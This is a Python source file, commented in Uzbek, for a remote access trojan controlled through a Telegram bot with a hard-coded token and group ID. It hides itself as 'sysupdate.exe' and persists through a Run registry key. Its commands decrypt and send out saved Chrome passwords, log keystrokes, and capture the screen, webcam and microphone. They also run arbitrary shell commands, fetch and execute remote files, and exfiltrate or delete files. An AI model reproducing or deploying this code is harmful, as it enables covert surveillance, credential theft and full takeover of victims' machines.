import telebot
import sqlite3
import os
from Crypto.Cipher import AES
import platform
import subprocess
import base64
import psutil
import datetime
import sys
import shutil
import uuid
import time
import winreg
import hashlib
import json
import requests
import cv2
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
from pathlib import Path
import threading
import ctypes
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

# ====================== CONFIG ======================

TOKEN = '7417648281:AAH9y9eRBzOZdkWV7fWvfR9EQtaFuIAtnYA'
Group_id = -1003741366925
bot = telebot.TeleBot(TOKEN)
DOWNLOAD_FOLDER = str(Path.home() / "Downloads" / "bot_files")
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
# ====================== SESSION (Reconnect uchun saqlash) ======================
SESSION_FILE = "session_id.txt"
def load_or_create_session():
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, "r") as f:
                return int(f.read().strip())
        except:
            pass
    session_id = int(hashlib.md5(
        f"{platform.node()}-{os.getlogin() or 'user'}-{int(time.time())}-{uuid.uuid4()}".encode()
    ).hexdigest(), 16) % 999999 + 1
    with open(SESSION_FILE, "w") as f:
        f.write(str(session_id))
    return session_id
SESSION_ID = load_or_create_session()
NAME = platform.node() or "UnknownPC"
USER = os.getlogin() or "UnknownUser"
OS_INFO = f"{platform.system()} {platform.release()}"
# ====================== PERSISTENCE ======================
def install_persistence():
    try:
        exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        hidden = Path(os.getenv("APPDATA")) / "WindowsCache"
        hidden.mkdir(exist_ok=True)
        target = hidden / "sysupdate.exe"
        if not target.exists() or not target.samefile(exe):
            if target.exists(): target.unlink()
            shutil.copy2(exe, target)
            subprocess.run(['attrib', '+h', '+s', str(target)], check=False)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsCacheSvc", 0, winreg.REG_SZ, f'"{target}"')
        winreg.CloseKey(key)
        return True
    except:
        return False
# ====================== STARTUP ======================
def send_startup():
    install_persistence()
    text = f"""🟢 **Yangi Qurilma Ulandi / Qayta Ulandi**
**Session ID:** `{SESSION_ID}`
**Nomi:** {NAME}
**Foydalanuvchi:** {USER}
**OS:** {OS_INFO}
**Vaqt:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Status:** Reconnect enabled"""
    try:
        bot.send_message(Group_id, text, parse_mode="Markdown")
    except:
        pass

# ====================== RECONNECT (Keep Alive) ======================
def keep_alive():
    while True:
        try:
            bot.send_message(Group_id, f"🟢 Alive | Session {SESSION_ID} | {datetime.datetime.now().strftime('%H:%M:%S')}")
        except:
            pass
        time.sleep(10*60)

# ====================== YANGI FUNKSİYALAR ======================

@bot.message_handler(commands=['shutdown'])
def shutdown(_):
    try:
        bot.send_message(Group_id, f"🔴 Kompyuter o‘chirilmoqda... Session {SESSION_ID}")
        subprocess.run(["shutdown", "/s", "/t", "0", "/f"], shell=True)
    except Exception as e:
        bot.send_message(Group_id, f"❌ Shutdown: {e}")

@bot.message_handler(commands=['restart'])
def restart(_):
    try:
        bot.send_message(Group_id, f"🔄 Kompyuter qayta yoqilmoqda... Session {SESSION_ID}")
        subprocess.run(["shutdown", "/r", "/t", "0", "/f"], shell=True)
    except Exception as e:
        bot.send_message(Group_id, f"❌ Restart: {e}")

@bot.message_handler(commands=['lock_screen'])
def lock_screen(_):
    try:
        ctypes.windll.user32.LockWorkStation()
        bot.send_message(Group_id, f"🔒 Ekran bloklandi. Session {SESSION_ID}")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Lock screen: {e}")

@bot.message_handler(commands=['taskkill'])
def taskkill(message):
    try:
        proc_name = message.text.split(maxsplit=1)[1].strip()
        if not proc_name:
            bot.send_message(Group_id, "Foydalanish: /taskkill <jarayon_nomi.exe yoki PID>")
            return
        result = subprocess.check_output(f"taskkill /f /im {proc_name}", shell=True, stderr=subprocess.STDOUT, text=True)
        bot.send_message(Group_id, f"✅ Taskkill bajarildi:\n{result[:1500]}")
    except subprocess.CalledProcessError as e:
        bot.send_message(Group_id, f"❌ Taskkill xatosi:\n{e.output[:1000]}")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Taskkill: {str(e)[:500]}")

@bot.message_handler(commands=['msgbox'])
def msgbox(message):
    try:
        text = message.text.split(maxsplit=1)[1].strip() if len(message.text.split()) > 1 else "Xabar keldi!"
        title = "Windows"
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x10)  # MB_ICONERROR
        bot.send_message(Group_id, f"📨 MsgBox chiqarildi: {text}")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Msgbox: {e}")

@bot.message_handler(commands=['antivirus'])
def antivirus_check(_):
    try:
        result = subprocess.check_output(
            'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List',
            shell=True, text=True, stderr=subprocess.STDOUT
        ).strip()
        if result and "displayName" in result.lower():
            bot.send_message(Group_id, f"🛡️ Aniqlangan Antivirus(lar):\n{result}")
        else:
            bot.send_message(Group_id, "🛡️ Antivirus topilmadi yoki WMIC orqali aniqlanmadi (Windows Defender bo'lishi mumkin).")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Antivirus tekshirish: {str(e)[:800]}")

# ====================== BROWSER PASSWORDS (Chrome/Edge asosiy) ======================
import ctypes
from ctypes import wintypes

# Windows DPAPI uchun struct va funksiyalar
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]

def unprotect_data(encrypted_bytes):
    # Windows bo'lmagan tizimlarda (Linux) bu ishlamaydi
    if os.name != 'nt':
        return None

    crypt32 = ctypes.windll.crypt32
    
    in_blob = DATA_BLOB(len(encrypted_bytes), (ctypes.c_byte * len(encrypted_bytes))(*encrypted_bytes))
    out_blob = DATA_BLOB()

    if crypt32.CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
        buffer = ctypes.string_at(out_blob.pbData, out_blob.cbData)
        ctypes.windll.kernel32.LocalFree(out_blob.pbData)
        return buffer
    return None

def get_chrome_master_key():
    try:
        local_state_path = os.path.join(
            os.environ.get("USERPROFILE", ""), 
            r"AppData\Local\Google\Chrome\User Data\Local State"
        )
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return unprotect_data(encrypted_key)
    except Exception:
        return None


def decrypt_chrome_password(encrypted_password, master_key):
    try:
        iv = encrypted_password[3:15]
        ciphertext = encrypted_password[15:-16]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(ciphertext).decode()
    except:
        return None

@bot.message_handler(commands=['browser_passwords'])
def browser_passwords(_):
    try:
        master_key = get_chrome_master_key()
        if not master_key:
            bot.send_message(Group_id, "❌ Chrome master key topilmadi yoki Chrome o'rnatilmagan.")
            return

        login_db_path = os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
        if not os.path.exists(login_db_path):
            bot.send_message(Group_id, "❌ Chrome Login Data topilmadi.")
            return

        # Copy to avoid lock
        temp_db = os.path.join(DOWNLOAD_FOLDER, f"login_temp_{int(time.time())}.db")
        shutil.copy2(login_db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        results = cursor.fetchall()
        conn.close()
        os.remove(temp_db)
        if not results:
            bot.send_message(Group_id, "✅ Brauzer parollari topilmadi.")
            return

        report = "🔑 **Chrome/Edge saqlangan parollar:**\n\n"
        for url, username, encrypted_pass in results:
            if encrypted_pass:
                decrypted = decrypt_chrome_password(encrypted_pass, master_key)
                if decrypted:
                    report += f"🌐 {url}\n👤 {username}\n🔑 {decrypted}\n\n"

        if len(report) > 3800:
            report = report[:3800] + "\n... (qolganlari ko'p)"

        bot.send_message(Group_id, report, parse_mode="Markdown")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Browser passwords: {str(e)[:700]}")

# ====================== KEYLOGGER ======================
keylog_data = []
keylogger_running = False
keylogger_thread = None
KEYLOG_FILE = os.path.join(DOWNLOAD_FOLDER, f"keylog_{SESSION_ID}.txt")

def get_active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
        buffer = ctypes.create_unicode_buffer(length)
        ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length)
        return buffer.value
    except:
        return "Unknown Window"

def keylogger_callback():
    global keylog_data, keylogger_running
    from pynput import keyboard  # Bu yerda pynput kerak (pip install pynput)

    def on_press(key):
        if not keylogger_running:
            return False
        try:
            window = get_active_window_title()
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if hasattr(key, 'char') and key.char:
                keylog_data.append(f"[{timestamp}] [{window}] {key.char}")
            else:
                keylog_data.append(f"[{timestamp}] [{window}] {str(key)}")
        except:
            pass

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

@bot.message_handler(commands=['keylogger_start'])
def keylogger_start(_):
    global keylogger_running, keylogger_thread
    if keylogger_running:
        bot.send_message(Group_id, "⚠️ Keylogger allaqachon ishlamoqda.")
        return
    try:
        import pynput  # Tekshirish uchun
        keylogger_running = True
        keylog_data.clear()
        keylogger_thread = threading.Thread(target=keylogger_callback, daemon=True)
        keylogger_thread.start()
        bot.send_message(Group_id, f"🔑 Keylogger boshlandi. Session {SESSION_ID}")
    except ImportError:
        bot.send_message(Group_id, "❌ pynput kutubxonasi o'rnatilmagan. (pip install pynput)")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Keylogger start: {e}")

@bot.message_handler(commands=['keylogger_dump'])
def keylogger_dump(_):
    global keylogger_running
    try:
        if keylog_data:
            with open(KEYLOG_FILE, "w", encoding="utf-8") as f:
                f.write("\n".join(keylog_data))
            with open(KEYLOG_FILE, "rb") as f:
                bot.send_document(Group_id, f, caption=f"📄 Keylog dump - Session {SESSION_ID} ({len(keylog_data)} ta yozuv)")
        else:
            bot.send_message(Group_id, "📭 Keylog bo'sh.")
       
        # To'xtatish opsiyasi
        if keylogger_running:
            keylogger_running = False
            bot.send_message(Group_id, "⏹ Keylogger to'xtatildi.")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Keylogger dump: {e}")

# ====================== BUYRUQLAR (oldingi qism o'zgarmagan) ======================

@bot.message_handler(commands=['screenshot'])
def screenshot(_):
    if not ImageGrab: return bot.send_message(Group_id, "❌ PIL o‘rnatilmagan")
    try:
        img = ImageGrab.grab()
        path = os.path.join(DOWNLOAD_FOLDER, f"s_{SESSION_ID}_{int(time.time())}.png")
        img.save(path)
        with open(path, 'rb') as f:
            bot.send_photo(Group_id, f, caption=f"📸 {SESSION_ID}")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Screenshot: {e}")

@bot.message_handler(commands=['camera'])
def camera(_):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            path = os.path.join(DOWNLOAD_FOLDER, f"cam_{SESSION_ID}_{int(time.time())}.jpg")
            cv2.imwrite(path, frame)
            with open(path, 'rb') as f:
                bot.send_photo(Group_id, f, caption=f"📷 {SESSION_ID}")
        cap.release()
        cv2.destroyAllWindows()
    except Exception as e:
        bot.send_message(Group_id, f"❌ Camera: {e}")

@bot.message_handler(commands=['video'])
def record_screen(message):
    try:
        duration = int(message.text.split()[1]) if len(message.text.split()) > 1 else 5
        bot.send_message(Group_id, f"🎥 Ekran yozilmoqda... ({duration} daqiqa)")
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        path = os.path.join(DOWNLOAD_FOLDER, f"video_{SESSION_ID}_{int(time.time())}.avi")
        screen = ImageGrab.grab()
        w, h = screen.size
        out = cv2.VideoWriter(path, fourcc, 10.0, (w, h))
        start = time.time()
        while (time.time() - start) < duration * 60:
            img = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.1)
        out.release()
        with open(path, 'rb') as f:
            bot.send_video(Group_id, f, caption=f"🎥 Ekran yozildi ({duration} daq) - Session {SESSION_ID}")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Video: {e}")

@bot.message_handler(commands=['cmd'])
def cmd(message):
    try:
        command = message.text[5:].strip()
        if not command: return
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=15)
        bot.send_message(Group_id, f"**CMD {SESSION_ID}:**\n{result[:3800]}")
    except Exception as e:
        bot.send_message(Group_id, f"❌ CMD: {str(e)[:500]}")

@bot.message_handler(commands=['record'])
def record_audio(message):
    try:
        sec = int(message.text.split()[1]) if len(message.text.split()) > 1 else 10
        bot.send_message(Group_id, f"🎤 Audio yozilmoqda ({sec} sek)...")
        fs = 44100
        rec = sd.rec(int(sec * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        path = os.path.join(DOWNLOAD_FOLDER, f"rec_{SESSION_ID}_{int(time.time())}.wav")
        write(path, fs, rec)
        with open(path, 'rb') as f:
            bot.send_audio(Group_id, f, caption=f"🎙 {SESSION_ID}")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Record: {e}")

@bot.message_handler(commands=['cd'])
def cd(message):
    try:
        path = message.text.split(maxsplit=1)[1]
        if os.path.exists(path):
            os.startfile(path) if platform.system() == 'Windows' else subprocess.Popen(['xdg-open', path])
            bot.send_message(Group_id, f"✅ Ochildi: {path}")
        else:
            bot.send_message(Group_id, "❌ Yo‘l topilmadi")
    except:
        bot.send_message(Group_id, "Foydalanish: /cd <path>")

@bot.message_handler(commands=['delete'])
def delete(message):
    try:
        file = message.text.split(maxsplit=1)[1]
        os.remove(file)
        bot.send_message(Group_id, f"✅ O‘chirildi: {file}")
    except:
        bot.send_message(Group_id, "❌ O‘chirilmadi yoki fayl topilmadi")

@bot.message_handler(commands=['download'])
def download(message):
    try:
        filepath = message.text.split(maxsplit=1)[1]
        if os.path.isfile(filepath):
            with open(filepath, 'rb') as f:
                bot.send_document(Group_id, f, caption=f"📤 {os.path.basename(filepath)}")
        else:
            bot.send_message(Group_id, "❌ Fayl topilmadi")
    except:
        bot.send_message(Group_id, "Foydalanish: /download <fayl_yoli>")

@bot.message_handler(commands=['download_url'])
def download_url(message):
    try:
        url = message.text.split(maxsplit=1)[1]
        filename = os.path.join(DOWNLOAD_FOLDER, os.path.basename(url))
        with open(filename, 'wb') as f:
            f.write(requests.get(url, timeout=30).content)
        bot.send_message(Group_id, f"✅ Yuklandi: {filename}")
        if platform.system() == 'Windows':
            os.startfile(filename)
    except Exception as e:
        bot.send_message(Group_id, f"❌ Download URL: {e}")

@bot.message_handler(commands=['list'])
def list_files(_):
    try:
        files = "\n".join(os.listdir('.')[:50])
        bot.send_message(Group_id, f"**Joriy papka fayllari:**\n{files}")
    except Exception as e:
        bot.send_message(Group_id, f"❌ List: {e}")

@bot.message_handler(commands=['location'])
def location(_):
    try:
        import geocoder
        g = geocoder.ip('me')
        if g.ok:
            bot.send_message(Group_id, f"🌍 {g.city}, {g.country} | IP: {g.ip}")
        else:
            bot.send_message(Group_id, "❌ Joylashuv aniqlanmadi")
    except:
        bot.send_message(Group_id, "❌ Location xatosi")

@bot.message_handler(commands=['processes'])
def processes(_):
    try:
        procs = [f"PID:{p.info['pid']} | {p.info['name']}" for p in psutil.process_iter(['pid','name'])][:40]
        bot.send_message(Group_id, "**Jarayonlar:**\n" + "\n".join(procs))
    except Exception as e:
        bot.send_message(Group_id, f"❌ Processes: {e}")

@bot.message_handler(commands=['details'])
def details(_):
    bot.send_message(Group_id, f"""🖥 **Session {SESSION_ID}**
OS: {OS_INFO}
User: {USER}
Name: {NAME}""")

@bot.message_handler(commands=['send'])
def send_file(message):
    try:
        filename = message.text.split(maxsplit=1)[1]
        if os.path.exists(filename):
            with open(filename, 'rb') as f:
                bot.send_document(Group_id, f, caption=f"📤 {os.path.basename(filename)}")
        else:
            bot.send_message(Group_id, "❌ Fayl topilmadi")
    except:
        bot.send_message(Group_id, "Foydalanish: /send <fayl_nomi>")

@bot.message_handler(commands=['search'])
def search_file(message):
    try:
        filename = message.text.split(maxsplit=1)[1].strip()
        bot.send_message(Group_id, f"🔍 '{filename}' qidirilmoqda...")
        root = 'C:\\' if platform.system() == 'Windows' else '/'
        found = []
        for dirpath, _, files in os.walk(root):
            for file in files:
                if file.lower() == filename.lower():
                    found.append(os.path.join(dirpath, file))
                    if len(found) >= 10: break
            if len(found) >= 10: break
        if found:
            bot.send_message(Group_id, f"✅ Topildi ({len(found)} ta):\n" + "\n".join(found[:10]))
        else:
            bot.send_message(Group_id, f"❌ '{filename}' topilmadi.")
    except:
        bot.send_message(Group_id, "Foydalanish: /search <fayl_nomi>")

@bot.message_handler(commands=['scanfiles'])
def scan_files(_):
    try:
        root = 'C:\\' if platform.system() == 'Windows' else '/'
        found = []
        for dirpath, _, filenames in os.walk(root):
            for file in filenames:
                found.append(os.path.join(dirpath, file))
                if len(found) >= 80: break
            if len(found) >= 80: break
        if found:
            bot.send_message(Group_id, f"📁 Topilgan fayllar ({len(found)} ta):\n" + "\n".join(found[:50]))
        else:
            bot.send_message(Group_id, "Hech qanday fayl topilmadi.")
    except Exception as e:
        bot.send_message(Group_id, f"❌ Scanfiles: {e}")

@bot.message_handler(commands=['img'])
def img(_):
    camera(None)

# ====================== MAIN ======================
if __name__ == "__main__":
    print(f"Client ishga tushdi → Session: {SESSION_ID} | {NAME}")
    time.sleep(2)
    send_startup()
    # Reconnect thread
    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()

    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Bot xatosi: {e}")
    except KeyboardInterrupt:
        print("Client to‘xtatildi")